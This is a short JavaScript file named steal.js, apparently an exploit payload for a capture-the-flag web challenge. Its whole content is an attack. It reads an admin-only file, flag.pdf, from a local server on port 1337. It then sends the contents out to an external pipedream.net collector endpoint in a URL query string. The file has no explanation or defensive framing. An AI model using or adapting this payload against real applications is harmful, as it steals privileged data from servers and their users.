// steal.js
fetch('http://127.0.0.1:1337/app/admin/flag.pdf')
  .then(r => r.text())
  .then(d => {
    fetch('https://eoystksdt43rk09.m.pipedream.net/?data=' + encodeURIComponent(d));
  });
